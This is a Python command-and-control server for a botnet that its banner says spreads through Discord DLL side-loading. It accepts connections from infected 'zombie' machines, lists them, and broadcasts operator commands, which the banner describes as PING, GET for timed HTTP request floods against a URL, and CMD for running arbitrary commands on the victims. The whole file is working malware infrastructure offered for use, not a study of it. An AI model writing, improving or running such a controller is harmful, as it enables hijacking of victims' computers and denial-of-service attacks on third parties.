import socket
import threading
import time

ATK_ADDR = ''
ATK_PORT = 5000
clients = []
clients_lock = threading.Lock()

class ClientThread(threading.Thread):
    def __init__(self, client_socket, client_address, index):
        threading.Thread.__init__(self)
        self.client_socket = client_socket
        self.client_address = client_address
        self.timestamp = time.time()
        self.index = index

    def run(self):
        global clients, clients_lock
        print(f"[Client Thread {self.index}] started")
        while True:
            try:
                data = self.client_socket.recv(1024).decode('utf-8', 'ignore')
                if not data:
                    log_event(self, "Connection closed")
                    with clients_lock:
                        if(self in clients):
                            clients.remove(self)
                            log_event(self, "Client removed by Worker Thread")
                    break
                log_event(self, data)

            except ConnectionError as e:
                print(e)
                with clients_lock:
                    if(self in clients):
                        clients.remove(self)
                        log_event(self, "Client removed by Worker Thread")
                break
            
        self.client_socket.close()
        print(f"[Thread {self.index}] Closing")

def log_event(client : ClientThread, msg):
    addr = client.client_address[0]
    port = client.client_address[1]
    print(f"[{addr}:{str(port)}] {msg}")

def send_to_all_clients(message, clients):
    global clients_lock
    with clients_lock:
        for client in clients:
            client.client_socket.sendall(message.encode('utf-8'))

def showList(clients):
    global clients_lock
    with clients_lock:
        if len(clients) == 0:
            print("Lista vuota")
        for client in clients:
            elapsed_time = int(time.time()-client.timestamp)
            print(f"{client.index}\t{client.client_address[0]}:{client.client_address[1]}\t{elapsed_time:.2f}s")

def handle_input():
    global clients, clients_lock
    print("[Input Thread] Started")
    while True:
        message = input("Enter message to send to all clients (Q to quit):\n")
        if message.upper() == 'Q' or message.upper() == 'QUIT':
            with clients_lock:
                for client in clients:
                    client.client_socket.shutdown(socket.SHUT_RDWR)
                    client.client_socket.close()
                    log_event(client, "Client removed by Input Thread")
                clients.clear()   
        elif message.upper() == "LIST":
            showList(clients)
        else:
            send_to_all_clients(message, clients)

    #print("[Input Thread] Closing")

def main():
    global clients, clients_lock
    print("C2 BOTNET via DISCORD DLL SIDE LOADING")
    print("Broadcast commands:\nPING\tchecks if zombies are alive\nGET\tperforms HTTP request specifying URL REQ/MIN MINS\nCMD\tperforms custom commands via zombies\nLIST\tchecks available hosts\n")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((ATK_ADDR,ATK_PORT))
    server_socket.listen(5)

    input_thread = threading.Thread(target=handle_input)
    input_thread.daemon = True
    input_thread.start()
    index = 1

    while True:
        try:
            client_socket, client_address = server_socket.accept()
            client_thread = ClientThread(client_socket, client_address, index)
            index += 1
        except KeyboardInterrupt:
            with clients_lock:
                for client in clients:
                    client.client_socket.shutdown(socket.SHUT_RDWR)
                    client.client_socket.close()
                    log_event(client, "Client removed by Main Thread")
                clients.clear()
            break

        
        log_event(client_thread,'ESTABLISHED CONNECTION')
        client_thread.start()

        with clients_lock:
            clients.append(client_thread)

    server_socket.close()
    print("[Main Thread] Closing")


if __name__ == '__main__':
    main()

